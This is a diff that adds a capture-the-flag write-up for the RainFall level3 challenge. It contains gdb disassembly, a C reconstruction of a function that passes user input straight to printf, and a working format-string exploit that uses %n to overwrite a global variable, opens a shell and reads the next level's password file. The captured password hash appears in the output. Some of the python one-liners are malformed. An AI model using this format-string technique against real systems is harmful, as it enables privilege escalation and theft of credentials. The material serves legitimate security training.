@@ -1,0 +1,76 @@
+   0x080484a4 <+0>:	push   ebp                        # start the function (2 lines)
+   0x080484a5 <+1>:	mov    ebp,esp
+   0x080484a7 <+3>:	sub    esp,0x218                  # allocate buffer of 0x218 bytes
+   0x080484ad <+9>:	mov    eax,ds:0x8049860
+   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
+   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
+   0x080484be <+26>:	lea    eax,[ebp-0x208]
+   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    eax,[ebp-0x208]
+   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    eax,ds:0x804988c
+   0x080484df <+59>:	cmp    eax,0x40
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>       # if m == 0x40
+   0x080484e4 <+64>:	mov    eax,ds:0x8049880
+   0x080484e9 <+69>:	mov    edx,eax
+   0x080484eb <+71>:	mov    eax,0x8048600
+   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx # stdout);
+   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc # 0xc, stdout);
+   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1 # 0x1, 0xc, stdout);
+   0x08048504 <+96>:	mov    DWORD PTR [esp],eax     # 0x8048600, 0x1, 0xc, stdout);
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>  # fwrite(0x8048600, 0x1, 0xc, stdout);
+   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>  # system(0x804860d)
+   0x08048518 <+116>:	leave
+   0x08048519 <+117>:	ret
+
+
+
+int m;
+
+void v() {
+  // allocated stack frame 0x218
+  char buffer[536];
+
+  // char *fgets(char *s, int size, FILE *stream);
+  fgets(buffer, 512, stdin); // stdin = 0, stdout = 1, stderr = 2
+  printf(buffer); // FSA
+  if (m == 64)
+  {
+    // size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream);
+    // size is size of data, nmemb is number of sets of data
+    // gdb-peda$ x/s 0x8048600
+    // 0x8048600:	 "Wait what?!\n"
+    fwrite("Wait what?!\n", 1, 13, stdout); // stdin = 0, stdout = 1, stderr = 2
+    // gdb-peda$ x/s 0x804860d
+    // 0x804860d:	 "/bin/sh"
+    system("/bin/sh");
+  }
+}
+
+int main(?) {
+  v();
+}
+
+
+
+// EXPLOIT BELOW
+printf("<64 chars>%n", 0804988c)
+buffer = ("<64 chars>%n" 0804988c)
+printf(buffer)
+
+
+for i in {0..20}; do python -c "import struct; print struct.pack('I',  + '%$i\$x'" | ./level3; done
+
+(python -c "import struct; print 'A'*(64-4) struct.pack('I',  + 0x0804988c) + '%4\$n'"; echo 'cat /home/user/level4/.pass') | ./level3
+
+
+
+
+
+level3@RainFall:~$ (python -c "import struct; print 'AAAAAAAA' + struct.pack('I',  + 0x0804988c) + 'A'*(64-12) + '%6\$n'"; echo 'cat /home/user/level4/.pass') | ./level3
+AAAAAAAA�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
